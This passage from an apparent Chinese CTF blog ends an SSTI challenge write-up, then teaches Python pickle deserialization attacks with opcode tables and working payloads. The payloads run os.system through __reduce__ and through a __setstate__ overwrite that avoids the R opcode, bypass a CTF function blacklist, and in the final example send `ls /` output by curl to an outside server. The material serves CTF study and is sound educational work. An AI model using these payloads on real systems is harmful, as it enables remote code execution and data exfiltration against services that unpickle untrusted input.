        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;What are you f* doing, guys?&#x27;</span>)
    blacklist2 = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]
    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist2]) + s</code></pre>
<p>上了两层waf，第一层就是简单的检测，第二层是在字符串前面拼接<code>&#123;% set config=None %&#125;&#123;% set self=None %&#125;</code>把config和self给覆盖掉了</p>
<p>主要的代码是在/genshop的路由下</p>
<p>来看一下路由逻辑</p>
<pre><code class="highlight plaintext">1.每次提交letter的都要消耗一定的money
2.每次提交的letter会经过waf接着被渲染到页面上(实际就是SSTI)</code></pre>
<p><code>stimulate() * 5000</code>这里的stimulate函数经过测试，会产生100以内的数</p>
<p>其中88以上的数字频率就很低了，但是这个数字还是很大说实话</p>
<p>然后就卡住了。</p>
<h4 id="fix-2"><a class="markdownIt-Anchor" href="#fix-2"></a> fix</h4>
<p>fix看别人的反而挺简单的</p>
<pre><code class="highlight plaintext"># return render_template_string(f&quot;&lt;h3&gt;&#123;result&#125;&lt;/h3&gt;&quot;)
return f&quot;&lt;h3&gt;&#123;result&#125;&lt;/h3&gt;&quot;</code></pre>
<p>我是上了一堆waf结果还是没拦住，也不知道啥问题，想过把动态渲染换成静态但是发现<code>render_template_string</code>的我写不来嘻嘻()</p>
<p>只会render和render_template，当时比赛的时候时间来不及了本地也没测过，属于因小失大了</p>
]]></content>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>随手打的pickle反序列化</title>
    <url>/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="pickle反序列化的利用"><a class="markdownIt-Anchor" href="#pickle反序列化的利用"></a> Pickle反序列化的利用</h1>
<h2 id="pickle是什么能吃吗"><a class="markdownIt-Anchor" href="#pickle是什么能吃吗"></a> pickle是什么，能吃吗</h2>
<p>pickle虽说是和python有点关系，但是不如说它更像一门单独的语言</p>
<p>既然要讲反序列化，那就先讲讲用于反序列化的函数</p>
<pre><code class="highlight plaintext">pickle.dump()//序列化
pickle.load()//反序列化
pickle.dumps()
pickle.loads()</code></pre>
<p>先写个实例来大致了解一下这个东东</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">class</span> <span class="title class_">myday</span>():
	task=<span class="string">&#x27;ctf&#x27;</span>
	sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))</code></pre>
<p>可以看到打印出了这样一串<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513135736987.png" alt="image-20250513135736987"></p>
<p>但是仔细一看，不太对，我的114514怎么被吞了</p>
<p>发现需要写一个函数来处理，重新写一下</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">class</span> <span class="title class_">myday</span>():
	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):
		<span class="variable language_">self</span>.task=<span class="string">&#x27;ctf&#x27;</span>
		<span class="variable language_">self</span>.sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513140625824.png" alt="image-20250513140625824"></p>
<p>真不赖吧。。</p>
<p>当然你也可以这样写</p>
<pre><code class="highlight python"><span class="keyword">import</span> os, pickle
<span class="keyword">class</span> <span class="title class_">Test</span>(<span class="title class_ inherited__">object</span>):
    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):
        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls&#x27;</span>,))
    
<span class="built_in">print</span>(pickle.dumps(Test(), protocol=<span class="number">0</span>))<span class="comment">#这边protocol是控制协议版本的，我们最常用的即是0的版本</span></code></pre>
<h2 id="pvm"><a class="markdownIt-Anchor" href="#pvm"></a> PVM</h2>
<p><s>是Plant VS Mamba吗</s></p>
<p>pickle是一种栈语言，基于一个轻量级的PVM</p>
<p>PVM由三个部分组成:</p>
<pre><code class="highlight plaintext">指令处理器
从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。
最终留在栈顶的值将被作为反序列化对象返回。

stack
由 Python 的 list 实现，被用来临时存储数据、参数以及对象。

memo
由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储</code></pre>
<p>飞个指令集<s>不用全看，反正很多用不到也看不懂</s>，可以仔细看看</p>
<pre><code class="highlight plaintext">MARK           = b&#x27;(&#x27;   # push special markobject on stack
STOP           = b&#x27;.&#x27;   # every pickle ends with STOP
POP            = b&#x27;0&#x27;   # discard topmost stack item
POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject
DUP            = b&#x27;2&#x27;   # duplicate top stack item
FLOAT          = b&#x27;F&#x27;   # push float object; decimal string argument
INT            = b&#x27;I&#x27;   # push integer or bool; decimal string argument
BININT         = b&#x27;J&#x27;   # push four-byte signed int
BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int
LONG           = b&#x27;L&#x27;   # push long; decimal string argument
BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int
NONE           = b&#x27;N&#x27;   # push None
PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg
BINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack
REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack
STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument
BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument
SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument
BINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument
APPEND         = b&#x27;a&#x27;   # append stack top to list below it
BUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()
GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string args
DICT           = b&#x27;d&#x27;   # build a dict from stack items
EMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dict
APPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack slice
GET            = b&#x27;g&#x27;   # push item from memo on stack; index is string arg
BINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg
INST           = b&#x27;i&#x27;   # build &amp; push class instance
LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg
LIST           = b&#x27;l&#x27;   # build list from topmost stack items
EMPTY_LIST     = b&#x27;]&#x27;   # push empty list
OBJ            = b&#x27;o&#x27;   # build &amp; push class instance
PUT            = b&#x27;p&#x27;   # store stack top in memo; index is string arg
BINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg
LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg
SETITEM        = b&#x27;s&#x27;   # add key+value pair to dict
TUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack items
EMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tuple
SETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairs
BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding

TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py
FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py</code></pre>
<p>常用的其实就下面几种，仔细介绍一下</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
</tr>
</thead>
<tbody>
<tr>
<td>c</td>
<td>获取一个全局对象或import一个模块</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、'等python字符串形式）</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
</tr>
</tbody>
</table>
<p>来个实例</p>
<p>而这些指令集就是组成opcode的关键</p>
<p>比如下面这段示例代码</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
os.system(<span class="string">&#x27;ls&#x27;</span>)</code></pre>
<p>用opcode表示可以这样表示</p>
<pre><code class="highlight plaintext">cos 
system #引入os.sysytem,压入栈
(S&#x27;ls&#x27; #压入一个MARK，再压入字符串ls
tR. #t把最后一个MARK处的元素包装成元组入栈
#R把元组作为os.system的参数，最后.运行</code></pre>
<p>这边给两个工具帮助我们调试</p>
<h3 id="pickletools"><a class="markdownIt-Anchor" href="#pickletools"></a> <strong>pickletools</strong></h3>
<p>pickletools是python自带的pickle调试器，有三个功能：反汇编一个已经被打包的字符串、优化一个已经被打包的字符串、返回一个迭代器来供程序使用。我们一般使用前两种</p>
<p>还是用上面那个代码，但是最后一行加一个<code>pickletools.dis(pickle.dumps(x))</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513145648001.png" alt="image-20250513145648001"></p>
<p>简单易懂对吧</p>
<p>但是实际上这种写法是还可以再简化的，因为我们实际上可以**把不必要的<code>PUT</code>指令给删除掉。**这个<code>PUT</code>意思是把当前栈的栈顶复制一份，放进储存区——很明显，我们这个class并不需要这个操作，可以省略掉这些<code>PUT</code>指令。</p>
<p>使用<code>pickletools.optimize</code>来简化，删去不需要的BINPUT操作</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">import</span> pickletools
<span class="keyword">class</span> <span class="title class_">myday</span>():
	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):
		<span class="variable language_">self</span>.task=<span class="string">&#x27;ctf&#x27;</span>
		<span class="variable language_">self</span>.sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))
y=pickletools.optimize(pickle.dumps(x))
pickletools.dis(y)</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513150109996.png" alt="image-20250513150109996"></p>
<p>可以看到，确实简化了不少</p>
<p>PS: 使用<code>pickletools.dis</code>分析一个字符串时，如果<code>.</code>执行完毕之后栈里面还有东西，会抛出一个错误；而<code>pickle.loads</code>没有这么严格的检查——它会正常结束。大家应该都知道反序列化字符串的拼接吧。（不知道可以去看看BUUCTF的piapiapia这道题）。通过这种方式我们就有可能实现反序列化字符串的拼接。</p>
<h2 id="反序列化漏洞"><a class="markdownIt-Anchor" href="#反序列化漏洞"></a> 反序列化漏洞</h2>
<h3 id="万恶之源__reduce__方法"><a class="markdownIt-Anchor" href="#万恶之源__reduce__方法"></a> 万恶之源–<code>__reduce__</code>方法</h3>
<p><code>__reduce__</code>对应的指令码即为R</p>
<p>它的作用如下</p>
<pre><code class="highlight plaintext">取当前栈的栈顶记为args，然后把它弹掉。
取当前栈的栈顶记为f，然后把它弹掉。
以args为参数，执行函数f，把结果压进当前栈。</code></pre>
<p>class的<code>__reduce__</code>方法，在pickle反序列化的时候会被执行。其底层的编码方法，就是利用了<code>R</code>指令码。 <code>f</code>要么返回字符串，要么返回一个tuple，后者对我们而言更有用。</p>
<p>一种很流行的攻击思路是：利用 <code>__reduce__</code> 构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。网上已经有海量的文章谈论这种方法，所以我们在这里不过多讨论。只给出一个例子：正常的字符串反序列化后，得到一个<code>Student</code>对象。我们想构造一个字符串，它在反序列化的时候，执行<code>ls /</code>指令</p>
<p>并且只要你的序列化结果中有这个R，恶意构造就不可避免</p>
<p>要是拿PHP来类比的话，其实就和_wakeup一样，是整个反序列化某种意义上的出口</p>
<p>那我问你，那我问你，我把R禁掉了怎么办</p>
<h3 id="waf"><a class="markdownIt-Anchor" href="#waf"></a> WAF</h3>
<h4 id="绕过函数黑名单"><a class="markdownIt-Anchor" href="#绕过函数黑名单"></a> 绕过函数黑名单</h4>
<p>有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>
<pre><code class="highlight text">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</code></pre>
<p>可惜<code>platform.popen()</code>不在名单里，它可以做到类似<code>system</code>的功能。这题死于黑名单有漏网之鱼。</p>
<p>另外，还有一个解（估计是出题人的预期解），那就是利用map来干这件事：</p>
<pre><code class="highlight text">class Exploit(object):
    def __reduce__(self):
 	return map,(os.system,[&quot;ls&quot;])</code></pre>
<p>总之，黑名单不可取。要禁止reduce这一套方法，最稳妥的方式是禁止掉<code>R</code>这个指令码。</p>
<h4 id="全局变量包含c指令码的妙用"><a class="markdownIt-Anchor" href="#全局变量包含c指令码的妙用"></a> 全局变量包含：<code>c</code>指令码的妙用</h4>
<p>有这么一道题，彻底过滤了<code>R</code>指令码（写法是：只要见到payload里面有<code>R</code>这个字符，就直接驳回，简单粗暴）。现在的任务是：给出一个字符串，<strong>反序列化之后，name和grade需要与blue这个module里面的name、grade相对应</strong>。</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-b42656fa4b3c95eaee8c37dccacad636_1440w.jpg" alt="img"></p>
<p>目标是取得well done</p>
<p>不能用<code>R</code>指令码了，不过没关系。还记得我们的<code>c</code>指令码吗？它专门用来获取一个全局变量。我们先弄一个正常的Student来看看序列化之后的效果：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-8b0cb8c071dadcde37abdce434a8f180_1440w.jpg" alt="img"></p>
<p>如何用<code>c</code>指令来换掉这两个字符串呢？以name的为例，只需要把硬编码的<code>rxz</code>改成从<code>blue</code>引入的<code>name</code>，写成指令就是：<code>cblue\nname\n</code>。把用于编码<code>rxz</code>的<code>X\x03\x00\x00\x00rxz</code>替换成我们的这个global指令，来看看改造之后的效果：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-2a5604887f01ef88aebf6409279e82a1_1440w.jpg" alt="img"></p>
<p>load一下，发现真的引入了blue里面的变量</p>
<p>把这个payload进行base64编码之后传进题目，得到well done。</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-d02aeb43085db59a6d4b41f88c5ea68e_1440w.jpg" alt="img"></p>
<p>顺带一提，由于pickle导出的字符串里面有很多的不可见字符，所以一般都经过base64编码之后传输。</p>
<h4 id="绕过c指令module限制先读入再篡改"><a class="markdownIt-Anchor" href="#绕过c指令module限制先读入再篡改"></a> 绕过<code>c</code>指令<code>module</code>限制：先读入，再篡改</h4>
<p>之前提到过，<code>c</code>指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法， 然而<code>find_class</code>可以被出题人重写。如果出题人只允许<code>c</code>指令包含<code>__main__</code>这一个module，这道题又该如何解决呢？</p>
<p>通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>
<p>有了这个知识作为前提，我们可以干这么一件事：</p>
<ul>
<li>通过<code>__main__.blue</code>引入这一个module，由于命名空间还在main内，故不会被拦截</li>
<li>把一个dict压进栈，内容是<code>&#123;'name': 'rua', 'grade': 'www'&#125;</code></li>
<li>执行BUILD指令，会导致改写 <code>__main__.blue.name</code>和 <code>__main__.blue.grade</code> ，至此<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li>
<li>弹掉栈顶，现在栈变成空的</li>
<li>照抄正常的Student序列化之后的字符串，压入一个正常的Student对象，name和grade分别是’rua’和’www’</li>
</ul>
<p>由于栈顶是正常的Student对象，pickle.loads将会正常返回。到手的Student对象，<a href="http://xn--namegradeblue-450uj96een3bdt1d9sxg.name">当然name和grade都与blue.name</a>、blue.grade对应了——我们刚刚亲手把blue篡改掉。</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nblue\n&#125;(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</code></pre>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-be0b611551c62614ea92f06ffe234480_1440w.jpg" alt="img"></p>
<p>绿框区域完成了篡改</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-5d923ca1b18273daec2e8131b64b8721_1440w.jpg" alt="img"></p>
<p>题目返回了well done，而且此时blue.grade已经变成www，可见我们真的篡改了blue.</p>
<p>所以思路就是用现成的白名单来进行RCE</p>
<h4 id="不用reduce也能rce"><a class="markdownIt-Anchor" href="#不用reduce也能rce"></a> 不用reduce，也能RCE</h4>
<p>之前谈到过，<code>__reduce__</code>与<code>R</code>指令是绑定的，禁止了<code>R</code>指令就禁止了<code>__reduce__</code> 方法。那么，在禁止<code>R</code>指令的情况下，我们还能RCE吗？这就是本文研究的重点。</p>
<p>现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用<code>fun(arg)</code>，其中<code>fun</code>和<code>arg</code>都必须可控。</p>
<p>审pickle源码，来看看BUILD指令（指令码为<code>b</code>）是如何工作的：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg" alt="img"></p>
<p>BUILD指令实现</p>
<p>这里的实现方式也就是上文的注所提到的：如果<code>inst</code>拥有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理；否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__ </code>里面。</p>
<p>它有什么安全隐患呢？我们来想想看：<code>Student</code>原先是没有<code>__setstate__</code>这个方法的。那么我们利用<code>&#123;'__setstate__': os.system&#125;</code>来BUILE这个对象，那么现在对象的<code>__setstate__</code>就变成了<code>os.system</code>；接下来利用<code>&quot;ls /&quot;</code>来再次BUILD这个对象，则会执行<code>setstate(&quot;ls /&quot;)</code> ，而此时<code>__setstate__</code>已经被我们设置为<code>os.system</code>，因此实现了RCE.</p>
<p>payload构造如下：</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb.&#x27;</code></pre>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-5f6f6661a916b296e3fac6fbed8427cc_1440w.jpg" alt="img"></p>
<p>执行结果：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-44a237be1ffe80cf2969d217831fe5dd_1440w.jpg" alt="img"></p>
<p>成功RCE！接下来可以通过反弹shell来控制靶机了。</p>
<p>有一个可以改进的地方：这份payload由于没有返回一个Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常Student进栈。payload构造如下：</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</code></pre>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-fd188e8d3e3f341d719019b7e869bf9d_1440w.jpg" alt="img"></p>
<p>绿色框内为恶意代码</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-d5b6e15f6b0506689952cf0e8f93691f_1440w.jpg" alt="img"></p>
<p>没有抛出异常。</p>
<p><strong>至此，我们完成了不使用<code>R</code>指令、无副作用的RCE。</strong></p>
<p>除此之外，其实我们还是可以通过一些其他类似的漏洞方法来打rce</p>
<pre><code class="highlight python">__reduce_ex__()
__setstate__()</code></pre>
<p>实例</p>
<pre><code class="highlight plaintext">#__setstate__:
import pickle
import pickletools
import os
class obj:
   def __init__(self,str1,str2):
      self.str1=str1;
      self.str2=str2;
   def __setstate__(self,name):
        os.system(&#x27;dir&#x27;)
#    def __reduce__(self):
#       return(os.system,(&#x27;dir&#x27;,))
class1=obj(&quot;str1&quot;,&quot;str2&quot;)
a=pickle.dumps(class1)      
print(a)
b=a
pickle.loads(b)

#setstate
</code></pre>
<h4 id="一些细节"><a class="markdownIt-Anchor" href="#一些细节"></a> 一些细节</h4>
<p><strong>一</strong>、**其他模块的load也可以触发pickle反序列化漏洞。**例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p>
<p>二、即使代码中没有<code>import os</code>，<strong>GLOBAL指令也可以自动导入<code>os.system</code></strong>。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p>
<p>三、**即使没有回显，也可以很方便地调试恶意代码。**只需要拥有一台公网服务器，执行<code>os.system('curl your_server/</code>ls / | base64<code>)</code>，然后查询您自己的服务器日志，就能看到结果。这是因为：以```引号包含的代码，在sh中会直接执行，返回其结果。</p>
<p>下面给出一个例子：</p>
<pre><code class="highlight text">payload  = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl 47.***.***.105/`ls / | base64`\nb.&#x27;</code></pre>
